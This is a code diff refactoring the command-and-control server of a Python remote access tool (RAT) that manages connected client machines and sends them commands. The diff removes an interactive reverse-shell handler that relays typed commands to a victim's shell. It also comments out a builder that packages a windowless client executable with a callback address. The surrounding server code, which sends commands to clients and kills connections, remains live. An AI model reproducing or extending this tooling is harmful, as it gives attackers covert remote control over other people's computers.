@@ -1,17 +1,15 @@
-import inspect
 import json
-import shlex
 import socket
 import subprocess
 import sys
 import threading
 import time
-from functools import partial
 
 from common.ratsocket import RATSocket
 from common.util import logger, parse
 from server.config.config import SOCKET_ADDR, ALIAS_PATH
-from server.util.command import Command
+from server.util.AliasManager import AliasManager
+from server.util.CommandExecutor import CommandExecutor
 from server.util.util import *
 from server.wrapper.client import Client
 
@@ -26,8 +24,7 @@ class Server:
         self.address = address
         self.socket = RATSocket()
         self.connections = []  # 存放已建立的连接
-        self.aliases = {}  # 存放命令别名
-        self.load_aliases()  # 加载命令别名
+        self.alias_manager = AliasManager()
 
     def serve(self):
         """
@@ -150,86 +147,6 @@ class Server:
         if conn:
             conn.send_command('kill')
 
-    def process_command(self, cmd, conn, executor):
-        """
-        判断命令类型并发送执行
-        :param cmd: 命令
-        :param conn: 连接
-        :param executor: 服务端命令
-        :return: 生成器
-        """
-        # grep_pattern = r'\s*\|\s*grep\s+(.+)\s*$'
-        # match = re.search(grep_pattern, cmd)
-        # if match:
-        #     keyword = match.group(1)
-        #     cmd = re.sub(grep_pattern, '', cmd)
-        #     func = self.process_command(cmd, conn, executor)
-        #     text = '\n'.join([i[1] for i in func() if len(i) >= 2])
-        #     print(find_and_highlight_keywords(text, keyword))
-        #     return
-        name, arg = parse(cmd)
-        # 服务端命令
-        cmds = [name for name, method in inspect.getmembers(executor, inspect.ismethod) if not name.startswith('__')]
-        if name in cmds:
-            func = partial(getattr(executor, name), arg)
-        # 别名
-        elif name in self.aliases:
-            func = partial(self.send_alias, conn, name, arg)
-        # 发送命令
-        else:
-            func = partial(conn.send_command, cmd)
-        return func
-
-    def revshell(self, cmd, conn, executor):
-        """
-        打开一个可完全交互的shell，支持stdin
-        """
-
-        # 后台接收线程，接收数据并在前台显示，如果出现异常终止线程
-        def recv():
-            try:
-                while 1:
-                    data = rev_con.recv(1024)
-                    if not data:
-                        break
-                    sys.stdout.write(data.decode('gbk'))
-                    sys.stdout.flush()
-            except socket.error as e:
-                logger.error(f'Connection aborted: {e}')
-                raise
-
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        addr = ('0.0.0.0', 0)
-        s.bind(addr)
-
-        # 服务端获取一个随机可用端口，并将其作为参数发送给客户端
-        cmd += f' {s.getsockname()[1]}'
-        func = self.process_command(cmd, conn, executor)
-        if func:
-            for i in func():
-                write(*i)
-
-        s.listen(5)
-        print('Listening on {}'.format(s.getsockname()))
-        rev_con, addr = s.accept()
-        print('Connection from {}'.format(addr))
-        threading.Thread(target=recv).start()
-        # line_sep = None
-        if os.name == 'nt':
-            line_sep = '\r\n'
-        else:
-            line_sep='\n'
-
-        while 1:
-            try:
-                cmd = input('>')  # 使用自定义提示符
-                if cmd.lower() in ['exit', 'quit']:
-                    rev_con.send(bytes('exit' + line_sep, encoding='gbk'))
-                    break
-                rev_con.send(bytes(cmd + line_sep, encoding='gbk'))
-            except (EOFError, KeyboardInterrupt):  # 处理 Ctrl+C / Ctrl+D
-                rev_con.send(bytes('exit' + line_sep, encoding='gbk'))
-                break
 
     def open_connection(self, conn: Client):
         """
@@ -240,7 +157,7 @@ class Server:
         conn.status = True  # 设置连接为交互中
         while not conn.results.empty():  # 连接前判断有没有未读消息
             logger.info(conn.results.get()[1])
-        executor = Command(conn, self)
+        command_executor = CommandExecutor(conn, self)
         try:
             while 1:
                 try:
@@ -261,11 +178,7 @@ class Server:
                             continue
                         self.open_connection(connection)
                         break
-                    elif cmd == 'revshell':
-                        self.revshell(cmd, conn, executor)
-                        continue
-
-                    func = self.process_command(cmd, conn, executor)
+                    func = command_executor.process_command(cmd)
                     if func:
                         for i in func():
                             write(*i)
@@ -312,8 +225,8 @@ class Server:
                 # 切换目录
                 elif name == 'cd':
                     print(cd(arg))
-                elif name == 'gen':
-                    gen(arg)
+                # elif name == 'gen':
+                #     gen(arg)
                 # 与指定客户端交互
                 else:
                     try:
@@ -329,66 +242,66 @@ class Server:
             finally:
                 print()
 
-    def load_aliases(self):
-        """
-        从文件中加载命令别名
-        """
-        try:
-            with open(ALIAS_PATH, 'r') as f:
-                self.aliases = json.load(f)
-        except:
-            pass
+    # def load_aliases(self):
+    #     """
+    #     从文件中加载命令别名
+    #     """
+    #     try:
+    #         with open(ALIAS_PATH, 'r') as f:
+    #             self.aliases = json.load(f)
+    #     except:
+    #         pass
+    #
+    # def save_aliases(self):
+    #     """
+    #     保存命令别名到文件
+    #     :return:
+    #     """
+    #     with open(ALIAS_PATH, 'w') as f:
+    #         json.dump(self.aliases, f)
 
-    def save_aliases(self):
-        """
-        保存命令别名到文件
-        :return:
-        """
-        with open(ALIAS_PATH, 'w') as f:
-            json.dump(self.aliases, f)
-
-    def send_alias(self, conn, name, arg):
-        """
-        发送命令别名
-        :param name: 别名
-        :param arg: 别名参数
-        :param conn: 连接
-        :return: 命令id，命令
-        """
-        command = self.aliases.get(name)
-        # 替换参数
-        regex = '<.*?>'
-        provided_args = shlex.split(arg)  # 实际传入的参数
-        required_args = re.findall(regex, command)  # 要求的参数
-        if len(required_args) > 0:  # 如果命令要求参数
-            if len(required_args) != len(provided_args):  # 如果参数个数不一致
-                raise SyntaxError('number of arguments does not match')
-            for arg in provided_args:
-                command = re.sub(regex, arg, command, count=1)
-        else:  # 命令原型中没有参数
-            if len(provided_args) != 0:  # 传入了参数
-                raise SyntaxError('no argument expected')
-        # 发送命令
-        func = partial(conn.send_command, command)
-        for i in func():
-            yield i
-
-
-def gen(address_port_str):
-    exit_code = subprocess.Popen("pyinstaller -Fw ratclient.py -i NONE", shell=True).wait()
-    if exit_code == 0:
-        print(f'Executable generated successfully: {os.path.abspath("dist/ratclient.exe")}')
-    else:
-        raise Exception(f"Error occurred while running pyinstaller. Exit code: {exit_code}")
-
-    if address_port_str.strip():
-        parts = address_port_str.split(':')
-        if len(parts) == 2:
-            ip_address = parts[0]
-            port = int(parts[1])
-            with open('dist/ratclient.ini', 'wt') as file:
-                file.write(f'[default]\nip = {ip_address}\nport = {port}')
-            print(f'Configuration file generated successfully: {os.path.abspath("dist/ratclient.ini")}')
+    # def send_alias(self, conn, name, arg):
+    #     """
+    #     发送命令别名
+    #     :param name: 别名
+    #     :param arg: 别名参数
+    #     :param conn: 连接
+    #     :return: 命令id，命令
+    #     """
+    #     command = self.aliases.get(name)
+    #     # 替换参数
+    #     regex = '<.*?>'
+    #     provided_args = shlex.split(arg)  # 实际传入的参数
+    #     required_args = re.findall(regex, command)  # 要求的参数
+    #     if len(required_args) > 0:  # 如果命令要求参数
+    #         if len(required_args) != len(provided_args):  # 如果参数个数不一致
+    #             raise SyntaxError('number of arguments does not match')
+    #         for arg in provided_args:
+    #             command = re.sub(regex, arg, command, count=1)
+    #     else:  # 命令原型中没有参数
+    #         if len(provided_args) != 0:  # 传入了参数
+    #             raise SyntaxError('no argument expected')
+    #     # 发送命令
+    #     func = partial(conn.send_command, command)
+    #     for i in func():
+    #         yield i
+#
+#
+# def gen(address_port_str):
+#     exit_code = subprocess.Popen("pyinstaller -Fw ratclient.py -i NONE", shell=True).wait()
+#     if exit_code == 0:
+#         print(f'Executable generated successfully: {os.path.abspath("dist/ratclient.exe")}')
+#     else:
+#         raise Exception(f"Error occurred while running pyinstaller. Exit code: {exit_code}")
+#
+#     if address_port_str.strip():
+#         parts = address_port_str.split(':')
+#         if len(parts) == 2:
+#             ip_address = parts[0]
+#             port = int(parts[1])
+#             with open('dist/ratclient.ini', 'wt') as file:
+#                 file.write(f'[default]\nip = {ip_address}\nport = {port}')
+#             print(f'Configuration file generated successfully: {os.path.abspath("dist/ratclient.ini")}')
 
 
 if __name__ == '__main__':
